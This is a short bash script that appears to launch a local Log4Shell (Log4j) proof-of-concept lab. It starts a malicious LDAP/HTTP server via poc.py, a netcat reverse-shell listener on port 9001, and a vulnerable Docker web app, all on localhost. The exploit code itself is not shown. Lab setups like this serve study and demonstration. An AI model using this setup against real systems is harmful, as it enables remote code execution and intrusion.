#! /bin/bash

xterm -title "HTTP LDAP Server" -e "cd /home/log4shell/Desktop/log4j-shell-poc && python poc.py --userip localhost --webport 8000 --lport 9001" &

xterm -title "netcat reverse shell" -e "cd /home/log4shell/Desktop/log4j-shell-poc && nc -lvnp 9001" &

xterm -title "web application (docker)" -e "cd /home/log4shell/Desktop/log4j-shell-poc && docker run --network host log4j-shell-poc" &

